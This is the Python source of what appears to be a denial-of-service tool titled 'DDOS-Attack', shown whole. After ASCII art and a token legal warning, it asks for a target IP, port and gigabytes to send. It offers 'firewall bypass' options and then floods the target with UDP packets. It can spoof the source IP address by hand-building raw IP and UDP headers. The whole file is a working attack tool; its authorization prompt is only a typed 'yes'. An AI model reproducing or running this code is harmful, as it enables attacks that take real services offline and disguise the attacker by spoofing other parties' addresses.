import sys
import os
import time
import socket
import ipaddress
import random
import struct

# ==================== Startup ASCII Art & Legal Warning ====================

os.system("clear")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
print("M       MMM M       MMM MMM     MMM MM       MM   BC-809")
print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   BC-809")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   BC-809")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   BC-809")
print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   BC-809")
print("M        MM M        MM MMM     MMM MM       MM   BC-809")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
print("SEVERE WARNING")
print("You have crossed the edge of law and ethics. Exit immediately, or wait 3 seconds.")
time.sleep(1)
print("3")
time.sleep(1)
print("2")
time.sleep(1)
print("1")
time.sleep(1)
print("Starting...")
time.sleep(2)

os.system("clear")
os.system("figlet DDOS-Attack")
print("Author    : BC-U809")
print("GitHub    : https://github.com/BC-809/DDOS-Attack.git")
print("")

# ==================== Parameter Input & Validation ====================

# Target IP validation
while True:
    try:
        ip_str = input("[?]IP Target : ").strip()
        ipaddress.ip_address(ip_str)
        target_ip = ip_str
        break
    except ValueError:
        print("[!] Invalid IP address, please try again.")

# Target port validation
while True:
    try:
        port_str = input("Port : ").strip()
        target_port = int(port_str)
        if 1 <= target_port <= 65535:
            break
        else:
            print("[!] Port must be between 1 and 65535.")
    except ValueError:
        print("[!] Invalid port number, please enter a number.")

# Total traffic input (in GB)
while True:
    try:
        gb_str = input("[?]Total data to send (GB) : ").strip()
        total_gb = float(gb_str)
        if total_gb <= 0:
            print("[!] Traffic must be greater than 0 GB.")
            continue
        break
    except ValueError:
        print("[!] Invalid value, please enter a number.")

# Optional rate limit (packet interval)
rate_limit = 0.0
try:
    rate_str = input("[?]Packet interval in seconds (0 = max speed, e.g. 0.1) : ").strip()
    rate_limit = float(rate_str)
except ValueError:
    rate_limit = 0.0

# ---------- Firewall Bypass Options ----------
print("\n--- Firewall Bypass Options (experimental) ---")
src = input("[?]Specify source port (leave blank for random): ").strip()
source_port = int(src) if src else None

frag = input("[?]Enable IP fragmentation? (y/N): ").strip().lower()
use_fragmentation = (frag == 'y')

rnd = input("Use random target port? (y/N): ").strip().lower()
random_target_port = (rnd == 'y')

# --- Spoofed source IP option ---
spoof_ip = input("Spoofed source IP address (leave blank to disable): ").strip()
if spoof_ip:
    try:
        ipaddress.ip_address(spoof_ip)   # validate
    except ValueError:
        print("[!] Invalid spoofed IP address, spoofing disabled.")
        spoof_ip = ""
if spoof_ip:
    print(f"[*] All packets will appear from source IP {spoof_ip} (requires root privileges)")

# Set payload size based on fragmentation
if use_fragmentation:
    PACKET_SIZE = 3000   # larger than common MTU, forces fragmentation
else:
    PACKET_SIZE = 1490

total_bytes = int(total_gb * 1024 * 1024 * 1024)
max_packets = total_bytes // PACKET_SIZE
print(f"\n[*] Will send {max_packets} packets, total {total_gb:.2f} GB.")
if rate_limit > 0:
    print(f"[*] Packet interval: {rate_limit} sec")
if source_port is not None:
    print(f"[*] Source port: {source_port}")
if use_fragmentation:
    print(f"[*] IP fragmentation enabled, payload size {PACKET_SIZE} bytes")
if random_target_port:
    print("[*] Random target port mode enabled")

# ==================== Target Reachability Check ====================

def check_target(ip, port):
    """Simple TCP connectivity test"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, port))
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

print("[*] Checking target connectivity...")
if not check_target(target_ip, target_port):
    print("[!] Target appears unreachable or TCP port is not open.")
    choice = input("Still attempt to send? (y/n): ").strip().lower()
    if choice != 'y':
        sys.exit(1)

# Final confirmation
print("\n[!] FINAL WARNING: You are about to send massive UDP traffic to the target.")
confirm = input("Are you sure this is your own isolated device with full authorization? (yes/no): ").strip().lower()
if confirm != 'yes':
    print("[*] Cancelled by user.")
    sys.exit(0)

# ==================== Attack Sending Loop ====================

# If spoofing source IP, we must use a raw socket
if spoof_ip:
    # Create raw socket (requires root)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print("[!] Failed to create raw socket. Please run with root privileges.")
        sys.exit(1)
    # Tell kernel we will build the IP header ourselves
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
else:
    # Normal UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Bind source port (only for normal sockets)
    if source_port is not None:
        try:
            sock.bind(('', source_port))
        except OSError as e:
            print(f"[!] Cannot bind source port {source_port}: {e}")
            sock.close()
            sys.exit(1)

# IP fragmentation settings (only for normal sockets; raw sockets handle it manually)
if use_fragmentation and not spoof_ip:
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)

payload = os.urandom(PACKET_SIZE)

sent = 0
sent_bytes = 0
next_mb_threshold = 1024 * 1024   # 1 MB
start_time = time.time()

try:
    while sent < max_packets:
        # Determine current target port
        if random_target_port:
            current_port = random.randint(1, 65535)
        else:
            current_port = target_port

        # ---------- Sending method selection ----------
        if spoof_ip:
            # Manually construct IP + UDP headers
            # IP header length 20 bytes (no options)
            ip_header_len = 20
            udp_header_len = 8
            total_len = ip_header_len + udp_header_len + len(payload)

            # IP header fields
            ip_ver = 4
            ip_ihl = 5
            ip_ver_ihl = (ip_ver << 4) + ip_ihl
            ip_tos = 0
            ip_tot_len = total_len
            ip_id = random.randint(0, 65535)
            ip_frag_off = 0
            ip_ttl = 64
            ip_proto = socket.IPPROTO_UDP
            ip_check = 0  # Kernel will calculate
            ip_saddr = socket.inet_aton(spoof_ip)
            ip_daddr = socket.inet_aton(target_ip)

            # Pack IP header (checksum left for kernel)
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                    ip_ver_ihl, ip_tos, ip_tot_len,
                                    ip_id, ip_frag_off,
                                    ip_ttl, ip_proto, ip_check,
                                    ip_saddr, ip_daddr)

            # UDP header
            udp_sport = source_port if source_port else random.randint(1024, 65535)
            udp_dport = current_port
            udp_len = udp_header_len + len(payload)
            udp_check = 0   # Checksum optional, set to 0 means no calculation
            udp_header = struct.pack('!HHHH', udp_sport, udp_dport, udp_len, udp_check)

            # Full packet
            packet = ip_header + udp_header + payload

            # Send (port argument is ignored because IP header is complete)
            sock.sendto(packet, (target_ip, 0))
        else:
            # Normal UDP send
            sock.sendto(payload, (target_ip, current_port))

        sent += 1
        sent_bytes += PACKET_SIZE

        # If not using random port and not spoofing, increment port (spoofed packets have port in header)
        if not random_target_port and not spoof_ip:
            target_port += 1
            if target_port > 65534:
                target_port = 1

        # Output progress every 1 MB
        if sent_bytes >= next_mb_threshold:
            mb_sent = sent_bytes / (1024 * 1024)
            elapsed = time.time() - start_time
            pps = sent / elapsed if elapsed > 0 else 0
            print(f"Sent: {sent} packets ({mb_sent:.2f} MB) | Elapsed: {elapsed:.1f}s | Rate: {pps:.1f} pps")
            next_mb_threshold += 1024 * 1024

        # Rate limiting
        if rate_limit > 0:
            time.sleep(rate_limit)

except KeyboardInterrupt:
    print("\n[!] Stopped by user.")
except Exception as e:
    print(f"\n[!] Error: {e}")
finally:
    sock.close()
    elapsed = time.time() - start_time
    print(f"\n[+] Attack finished. Total packets: {sent}, Total data: {sent_bytes / (1024*1024):.2f} MB, Elapsed: {elapsed:.2f} sec.")
